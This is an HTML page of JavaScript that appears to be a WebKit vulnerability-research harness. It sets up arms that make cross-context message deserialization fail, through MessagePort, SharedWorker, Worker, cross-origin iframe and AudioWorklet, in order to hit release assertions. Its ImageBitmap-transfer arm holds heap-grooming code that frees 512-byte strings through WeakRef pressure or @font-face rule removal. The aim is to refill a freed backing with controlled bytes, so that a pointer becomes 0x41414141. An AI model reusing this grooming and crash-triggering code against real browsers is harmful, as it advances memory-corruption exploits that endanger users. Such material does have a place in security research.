<!doctype html>
<meta charset="utf-8">
<title>caps11 — the family behind the deserialization abort: one mechanism per arm</title>
<body><p id="p">caps11</p>
<script>
// docs/90.  docs/89 measured ONE member of the family behind
//     RELEASE_ASSERT(vm.hasPendingTerminationException())
//   at MessagePort.cpp:295 / WorkerMessagingProxy.cpp:245 / LocalDOMWindow.cpp:947 /
//      BroadcastChannel.cpp:256 / ServiceWorkerContainer.cpp:472
// Here every *page-reachable* way to make a message deserialization fail or throw is its own arm,
// one variable per arm, and the control differs only in that variable.
//
// The six dispatch sites are the six RELEASE_ASSERTs that follow MessageEvent::create:
//   dom/MessagePort.cpp:295                 dom/BroadcastChannel.cpp:256
//   page/LocalDOMWindow.cpp:947             workers/WorkerMessagingProxy.cpp:199 and :245
//   workers/service/ServiceWorkerContainer.cpp:472
//
// Arms:
//   mode=dvport      DataView(buf,0,LEN) explicit + resizable + getter shrink + transfer  (docs/89 repro)
//   mode=dvportok    the same, getter does not shrink                                     (control)
//   mode=swwasm      WebAssembly.Module -> new SharedWorker(...).port   [agent cluster: -default vs -sharedworker]
//   mode=swu8        Uint8Array -> the same port                                          (control)
//   mode=swobj       plain object -> the same port                                        (control)
//   mode=dedwasm     WebAssembly.Module -> a dedicated Worker                             (control: same cluster)
//   mode=ifrwasm     WebAssembly.Module -> cross-origin iframe via window.postMessage      (cluster = per process)
//   mode=ifrobj      plain object -> the same iframe                                      (control)
//   mode=arrmax      {a: <sparse array of length 0x10000001>} over a MessagePort
//   mode=arrbig      the same at length 1000                                              (control)
//   mode=bmptrans    ImageBitmap in the transfer list, close()d from inside the walk
//   mode=bmptransok  the same bitmap transferred, not closed                              (control)
//   mode=awblob      Blob -> an AudioWorklet port   (only where ENABLE_WEB_AUDIO; console has it OFF)
//   mode=tlreject    the three sender-side SerializedScriptValue::create rejections       (control: throws at postMessage)
//   mode=blank       the iframe document: beacons stomp=1 and reports what it receives
// knobs: len=<buffer length>, n=<array length>, reps=<n>
(function () {
  'use strict';
  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
  var Q = new URLSearchParams(location.search);
  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }

  var MODE  = K('mode', 'cap');
  var REPS  = Math.max(1, parseInt(K('reps', '1'), 10));
  var DELAY = Math.max(0, parseInt(K('delay', '200'), 10));
  var LEN   = Math.max(8, parseInt(K('len', '192'), 10));
  var NLEN  = Q.has('n') ? parseInt(Q.get('n'), 10) : 0x10000001;
  if (MODE === 'arrbig') NLEN = 1000;

  var AB_RESIZE = (function () { try { return typeof ArrayBuffer.prototype.resize; } catch (e) { return 'err'; } })();
  var GMODE = K('groom', '0');
  var GROOM = GMODE !== '0';

  B('cap', 'mode=' + MODE + '&resize=' + AB_RESIZE +
    '&mc=' + (typeof MessageChannel) + '&wk=' + (typeof Worker) +
    '&swk=' + (typeof SharedWorker) + '&sw=' + (typeof navigator.serviceWorker) +
    '&wasm=' + (typeof WebAssembly) + '&wasmmod=' + (typeof WebAssembly === 'object' ? typeof WebAssembly.Module : '-') +
    '&bmp=' + (typeof createImageBitmap) + '&ac=' + (typeof AudioContext) +
    '&aw=' + (typeof AudioWorkletNode) + '&offc=' + (typeof OffscreenCanvas) +
    '&ovc=' + (typeof VideoFrame) + '&tcos=' + (typeof HTMLCanvasElement.prototype.transferControlToOffscreen) +
    '&sc=' + (typeof structuredClone) + '&pm3=' + (window.postMessage.length));

  // mode=cap: capability probe only, no risky call.
  if (MODE === 'cap') { B('done', 'n=0&mode=cap'); return; }

  // ---------------------------------------------------------------- iframe document
  if (MODE === 'blank') {
    B('stomp', 'at=iframe&origin=' + encodeURIComponent(location.origin));
    window.onmessage = function (e) {
      var d = e.data, t = '-';
      try { t = Object.prototype.toString.call(d); } catch (x) {}
      var w = -1;
      try { w = (typeof WebAssembly === 'object' && d instanceof WebAssembly.Module) ? 1 : 0; } catch (x) {}
      B('ifrx', 'got=1&t=' + encodeURIComponent(t) + '&wasm=' + w + '&origin=' + encodeURIComponent(location.origin));
    };
    return;
  }

  var rep = 0, done = 0;
  function next() {
    if (done >= REPS) { B('done', 'n=' + done + '&mode=' + MODE); return; }
    setTimeout(run, 30);
  }

  // ---------------------------------------------------------------- workers
  var wrk = null, sw = null, swReady = false;
  function mkWorker(src, onmsg) {
    var w = null;
    try { w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' }))); }
    catch (e) { B('wkfail', 'e=' + e.name); return null; }
    if (onmsg) w.onmessage = function (e) { onmsg(e.data); };
    w.onerror = function (e) { B('wkerr', 'm=' + encodeURIComponent(String(e && e.message))); };
    return w;
  }
  var ECHO = 'onmessage=function(e){var r={n:e.data&&e.data.n};' +
    'var v=e.data&&e.data.v;if(v){r.vl=v.length;r.vb=v.byteLength;}' +
    'try{r.t=Object.prototype.toString.call(e.data);r.w=(typeof WebAssembly==="object")&&(e.data instanceof WebAssembly.Module)?1:0;}catch(x){r.err=x.name;}' +
    'try{postMessage(r);}catch(x){}};';
  var SWECHO = 'onconnect=function(e){var p=e.ports[0];' +
    'p.onmessage=function(ev){var r={n:ev.data&&ev.data.n};var v=ev.data&&ev.data.v;if(v){r.vl=v.length;r.vb=v.byteLength;}' +
    'try{r.t=Object.prototype.toString.call(ev.data);r.w=(typeof WebAssembly==="object")&&(ev.data instanceof WebAssembly.Module)?1:0;}catch(x){r.err=x.name;}' +
    'try{p.postMessage(r);}catch(x){}};' +
    'try{p.postMessage({ready:1});}catch(x){}};';

  function sharedWorker(cb) {
    if (sw) return cb(sw);
    try { sw = new SharedWorker(URL.createObjectURL(new Blob([SWECHO], { type: 'text/javascript' }))); }
    catch (e) { B('swfail', 'e=' + e.name); return cb(null); }
    sw.onerror = function (e) { B('swerr', 'm=' + encodeURIComponent(String(e && e.message))); };
    sw.port.onmessage = function (e) {
      var d = e.data;
      if (d && d.ready) { swReady = true; B('swready', 'mode=' + MODE); return cb(sw); }
      B('rx', 'mode=' + MODE + '&from=sw&n=' + (d && d.n) + '&t=' + encodeURIComponent(d && d.t) + '&w=' + (d && d.w) + '&vl=' + (d && d.vl) + '&vb=' + (d && d.vb));
      done++; rep++; setTimeout(next, 150);
    };
    // if the worker is slow, try anyway after 800 ms
    setTimeout(function () { if (!swReady) { B('swlate', 'mode=' + MODE); cb(sw); } }, 800);
    return null;
  }

  function run() {
    var tag = 'R' + rep;
    var t0 = 0, ms = -1;

    // ============================================================ controls
    if (MODE === 'tlreject') {
      var buf1 = new ArrayBuffer(64), e1 = '', e2 = '', e3 = '';
      try { var c0 = new MessageChannel(); c0.port1.postMessage({ b: buf1 }, [buf1, buf1]); e1 = 'nothrow'; }
      catch (e) { e1 = e.name; }
      var buf2 = new ArrayBuffer(64); try { structuredClone(buf2, { transfer: [buf2] }); } catch (e) {}
      try { var c1 = new MessageChannel(); c1.port1.postMessage({ b: buf2 }, [buf2]); e2 = 'nothrow'; }
      catch (e) { e2 = e.name; }
      try { var c2 = new MessageChannel(); c2.port1.postMessage({ o: {} }, [{}]); e3 = 'nothrow'; }
      catch (e) { e3 = e.name; }
      B('wx' + tag, 'mode=tlreject&dup=' + e1 + '&detached=' + e2 + '&plain=' + e3);
      done++; rep++; return setTimeout(next, 150);
    }

    // ============================================================ witness self-test
    if (MODE === 'wtest') {
      var wk = K('k', 'obj');
      var refs = [];
      for (var i = 0; i < 200; i++) {
        var o;
        if (wk === 'str') o = new String(atob(btoa(new Array(493).join('A'))));
        else if (wk === 'holder') o = { s: atob(btoa(new Array(493).join('A'))) };
        else o = { k: i };
        refs.push(new WeakRef(o));
      }
      setTimeout(function () {
        var junk = [], rounds = 0, dead = 0;
        for (var i = 0; i < 900000; i++) {
          junk.push({ k: i });
          if ((i % 50000) === 49999) { rounds++; if (refs[0].deref() === undefined) { dead = 1; break; } }
        }
        B('wtest', 'k=' + wk + '&rounds=' + rounds + '&dead=' + dead + '&junk=' + junk.length);
        done++; rep++; setTimeout(next, 100);
      }, 30);
      return;
    }

    // ============================================================ array arms
    if (MODE === 'arrmax' || MODE === 'arrbig') {
      var a = []; a.length = NLEN;
      var chA = new MessageChannel(), gotA = false;
      chA.port2.onmessage = function (ev) {
        if (gotA) return; gotA = true;
        var d = ev.data, av = d && d.a;
        B('rx' + tag, 'mode=' + MODE + '&n=' + NLEN + '&al=' + (av ? av.length : -2) + '&t=' + encodeURIComponent(d && d.t));
        done++; rep++; setTimeout(next, 150);
      };
      t0 = performance.now();
      try { chA.port1.postMessage({ a: a, t: 'arr' }); ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=' + MODE + '&n=' + NLEN + '&ms=' + ms + '&post=1'); }
      catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=' + MODE + '&n=' + NLEN + '&ms=' + ms + '&posterr=' + e.name); }
      setTimeout(function () { if (!gotA) { B('to' + tag, 'mode=' + MODE + '&n=' + NLEN); done++; rep++; setTimeout(next, 100); } }, 4000);
      return;
    }

    // ============================================================ ImageBitmap transfer
    if (MODE === 'bmptrans' || MODE === 'bmptransok') {
      var cvs = document.createElement('canvas'); cvs.width = 32; cvs.height = 32;
      var cx = cvs.getContext('2d'); cx.fillStyle = '#0f0'; cx.fillRect(0, 0, 32, 32);
      var cgch = K('gch', 'A');   // raw: A | Z (NUL bytes) | X (AAAA\0\0\0\0 pattern)
      var cgb = btoa(new Array(493).join(cgch === 'Z' ? '\u0000' : 'A'));
      createImageBitmap(cvs).then(function (bmp) {
        var ch = new MessageChannel(), got = false;
        ch.port2.onmessage = function (ev) {
          if (got) return; got = true;
          var d = ev.data, b = d && d.b;
          var det = -1; try { det = b ? (typeof b.close === 'function' ? 0 : -1) : -2; } catch (x) {}
          B('rx' + tag, 'mode=' + MODE + '&got=1&t=' + encodeURIComponent(d && d.t) + '&det=' + det + '&g=' + (d && d.g));
          done++; rep++; setTimeout(next, 150);
        };
        var msg = { b: bmp };
        Object.defineProperty(msg, 'g', { enumerable: true, configurable: true, get: function () {
          if (MODE === 'bmptrans') { try { bmp.close(); } catch (e) { B('closeerr', 'e=' + e.name); } }
          return 1;
        } });
        function doPost(extra) {
          t0 = performance.now();
          try { ch.port1.postMessage(msg, [bmp]); ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=' + MODE + (extra ? '&' + extra : '') + '&ms=' + ms + '&post=1'); }
          catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=' + MODE + (extra ? '&' + extra : '') + '&ms=' + ms + '&posterr=' + e.name); done++; rep++; setTimeout(next, 150); return; }
          setTimeout(function () { if (!got) { B('to' + tag, 'mode=' + MODE); done++; rep++; setTimeout(next, 100); } }, 4000);
        }
        if (!GROOM) return doPost();
        if (GMODE === '2') {
          // deterministic free, no GC: a CSS @font-face rule whose family name is a 492-char
          // string (StringImpl 0x14 + 492 = 512 B, the vector's own class).  Staging the rules
          // makes the faces, the second layout removes them and buildCompleted() frees them --
          // the docs/65 free site -- microseconds before detachBitmaps() allocates the Vector.
          return setTimeout(function () {
            // gch=X: 8-byte pattern 'AAAA\0\0\0\0' so the pointer becomes 0x41414141 and ASAN
            // prints the shadow address (a low value is checked against the shadow); gch=Z: zeros
            // so m_serializedBitmap is 0 and connect() returns early (the message arrives).
            var CH, glen = parseInt(K('glen', '492'), 10);
            if (cgch === 'Z') CH = '\u0000'.repeat(glen);
            else if (cgch === 'X') CH = ('AAAA\u0000\u0000\u0000\u0000').repeat(Math.floor(glen / 8)) + 'A'.repeat(glen % 8);
            else CH = 'A'.repeat(glen);
            var st = document.createElement('style'); document.body.appendChild(st);
            var css = '';
            for (var i = 0; i < 64; i++) css += '@font-face{font-family:"' + CH + '";src:local(NoSuchFontName)}\n';
            st.textContent = css;
            var h1 = document.body.offsetHeight;
            var rl = (st.sheet && st.sheet.cssRules.length) ? st.sheet.cssRules[0].cssText.length : -1;
            // no beacon between the frees and the post: every Image allocates
            if (st.sheet) { var n = st.sheet.cssRules.length; for (var i = 0; i < n; i++) st.sheet.deleteRule(0); }
            document.body.offsetHeight;            // buildCompleted: the faces are freed here
            var f2 = document.fonts.size;
            doPost('g=2&gch=' + cgch + '&glen=' + glen + '&rulelen=' + rl + '&faces=' + f2 + '&faces0=' + n);
          }, 0);
        }
        // The groom must free flat 512-byte StringImpls (0x14 header + 492 8-bit chars; the
        // backend-store Vector element is 32 B and minCapacity 16 -> one 512 B malloc) so an
        // empty std::optional<ImageBitmapBacking> can be handed one back with our bytes in the
        // payload.  A WeakRef target is kept alive for the whole job, so the alloc, the drain and
        // the post are three jobs.  gch=Z grooms zero bytes: m_serializedBitmap and the engaged
        // flag become 0, connect() returns early, and the message arriving is the oracle.
        var refs = [];
        for (var i = 0; i < 200; i++) refs.push(new WeakRef(new String(atob(cgb))));
        setTimeout(function () {                       // job 2: the targets are only weakly held now
          var junk = [], rounds = 0, dead = 0;
          for (var i = 0; i < 900000; i++) {
            junk.push({ k: i });
            if ((i % 50000) === 49999) { rounds++; if (refs[0].deref() === undefined) { dead = 1; break; } }
          }
          B('groom' + tag, 'mode=' + MODE + '&n=200&chars=492&b64=' + cgb.length +
            '&gch=' + cgch + '&rounds=' + rounds + '&dead=' + dead + '&junk=' + junk.length);
          setTimeout(doPost, 30);                      // job 3: the message, after the frees
        }, 30);
        return;
      }, function (e) { B('bmpfail', 'e=' + (e && e.name)); done++; rep++; setTimeout(next, 150); });
      return;
    }

    // ============================================================ AudioWorklet
    if (MODE === 'awblob') {
      try {
        var ac = new AudioContext();
        var awsrc = 'class AW extends AudioWorkletProcessor{process(){return true;}}registerProcessor("aw",AW);';
        var awurl = URL.createObjectURL(new Blob([awsrc], { type: 'text/javascript' }));
        ac.audioWorklet.addModule(awurl).then(function () {
          var node = new AudioWorkletNode(ac, 'aw');
          node.port.onmessage = function (e) { B('rx' + tag, 'mode=awblob&from=aw&t=' + encodeURIComponent(Object.prototype.toString.call(e.data))); done++; rep++; setTimeout(next, 150); };
          B('wx' + tag, 'mode=awblob&node=1');
          // the processor only exists once the node is in the graph and the context runs
          try { node.connect(ac.destination); } catch (e) { B('awconn', 'e=' + e.name); }
          try { ac.resume(); } catch (e) {}
          setTimeout(function () {
            B('wx' + tag, 'mode=awblob&state=' + ac.state + '&posting=1');
            try { node.port.postMessage(new Blob(['x'], { type: 'text/plain' })); B('wx' + tag, 'mode=awblob&post=1'); }
            catch (e) { B('wx' + tag, 'mode=awblob&posterr=' + e.name); }
          }, 600);
          setTimeout(function () { B('to' + tag, 'mode=awblob'); done++; rep++; setTimeout(next, 100); }, 4500);
        }, function (e) {
          B('awfail', 'e=' + (e && e.name));
          done++; rep++; setTimeout(next, 150);
        });
      } catch (e) { B('awfail', 'e=' + e.name); done++; rep++; setTimeout(next, 150); }
      return;
    }

    // ============================================================ Wasm arms
    var mod = null, hasWasm = (typeof WebAssembly === 'object' && typeof WebAssembly.Module === 'function');
    if (MODE === 'swwasm' || MODE === 'dedwasm' || MODE === 'ifrwasm') {
      if (!hasWasm) { B('nowasm', 'mode=' + MODE); done++; rep++; return setTimeout(next, 150); }
      try { mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])); }
      catch (e) { B('modfail', 'mode=' + MODE + '&e=' + e.name); done++; rep++; return setTimeout(next, 150); }
      B('modok', 'mode=' + MODE + '&tag=' + encodeURIComponent(Object.prototype.toString.call(mod)));
    }

    if (MODE === 'swwasm' || MODE === 'swu8' || MODE === 'swobj') {
      return sharedWorker(function (w) {
        if (!w) { done++; rep++; return setTimeout(next, 150); }
        var payload, base = 'mode=' + MODE + '&stage=post';
        if (MODE === 'swwasm') payload = mod;
        else if (MODE === 'swu8') payload = new Uint8Array(new ArrayBuffer(16));
        else payload = { n: rep, v: new Uint8Array(new ArrayBuffer(8)) };
        t0 = performance.now();
        try { w.port.postMessage(payload); ms = Math.round(performance.now() - t0); B('wx' + tag, base + '&ms=' + ms + '&post=1'); }
        catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, base + '&ms=' + ms + '&posterr=' + e.name); done++; rep++; return setTimeout(next, 150); }
        setTimeout(function () { if (!swReady) B('to' + tag, base + '&late=1'); }, 4000);
      });
    }

    if (MODE === 'dedwasm') {
      if (!wrk) wrk = mkWorker(ECHO, function (d) {
        B('rx' + tag, 'mode=dedwasm&from=wk&n=' + (d && d.n) + '&t=' + encodeURIComponent(d && d.t) + '&w=' + (d && d.w) + '&vl=' + (d && d.vl) + '&vb=' + (d && d.vb));
        done++; rep++; setTimeout(next, 150);
      });
      if (!wrk) { done++; rep++; return setTimeout(next, 200); }
      t0 = performance.now();
      try { wrk.postMessage(mod); ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=dedwasm&ms=' + ms + '&post=1'); }
      catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, 'mode=dedwasm&ms=' + ms + '&posterr=' + e.name + '&nopost=1'); done++; rep++; return setTimeout(next, 150); }
      setTimeout(function () { B('to' + tag, 'mode=dedwasm&late=1'); }, 4000);
      return;
    }

    if (MODE === 'ifrwasm' || MODE === 'ifrobj') {
      var fr = document.createElement('iframe');
      fr.width = 40; fr.height = 40;
      var host = location.hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1';
      fr.src = location.protocol + '//' + host + ':' + location.port + '/caps11.html?mode=blank';
      document.body.appendChild(fr);
      fr.onload = function () {
        setTimeout(function () {
          var payload = (MODE === 'ifrwasm') ? mod : { n: rep, t: 'obj' };
          B('wx' + tag, 'mode=' + MODE + '&load=1&origin=' + encodeURIComponent(location.origin) + '&host=' + host);
          try { fr.contentWindow.postMessage(payload, '*'); B('wx' + tag, 'mode=' + MODE + '&post=1'); }
          catch (e) { B('wx' + tag, 'mode=' + MODE + '&posterr=' + e.name); done++; rep++; setTimeout(next, 150); return; }
          setTimeout(function () { B('to' + tag, 'mode=' + MODE + '&late=1'); done++; rep++; setTimeout(next, 150); }, 3000);
        }, 400);
      };
      return;
    }

    // ============================================================ default: DataView arms
    var buf;
    try { buf = new ArrayBuffer(LEN, { maxByteLength: LEN }); }
    catch (e) { B('wx' + tag, 'mode=' + MODE + '&mkerr=' + e.name); done++; rep++; return setTimeout(next, 150); }
    var gx = -1, gx2 = -1, gn = 0;
    var view = new DataView(buf, 0, LEN);
    var msg = { c: rep, v: view };
    var SHRINK = (MODE !== 'dvportok');
    Object.defineProperty(msg, 'g', { enumerable: true, configurable: true, get: function () {
      gn++; gx = buf.byteLength;
      if (SHRINK) { try { buf.resize(0); gx2 = buf.byteLength; } catch (e) { gx2 = -9; } }
      return 1;
    } });
    var ch = new MessageChannel(), fin = false;
    ch.port2.onmessage = function (ev) {
      if (fin) return; fin = true;
      var d = ev.data, v = d && d.v;
      B('rx' + tag, 'mode=' + MODE + '&len=' + LEN + '&gx=' + gx + '&gx2=' + gx2 + '&gn=' + gn +
        '&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) + '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1));
      done++; rep++; setTimeout(next, 150);
    };
    t0 = performance.now();
    try { ch.port1.postMessage(msg, [buf]); ms = Math.round(performance.now() - t0); }
    catch (e) { B('wx' + tag, 'mode=' + MODE + '&ms=' + Math.round(performance.now() - t0) + '&txe=' + e.name); done++; rep++; return setTimeout(next, 150); }
    B('wx' + tag, 'mode=' + MODE + '&len=' + LEN + '&gx=' + gx + '&gx2=' + gx2 + '&gn=' + gn + '&ms=' + ms + '&post=1&tx=' + buf.byteLength);
    setTimeout(function () { if (!fin) { B('to' + tag, 'mode=' + MODE); done++; rep++; setTimeout(next, 100); } }, 3000);
  }

  setTimeout(run, DELAY);
})();
</script>
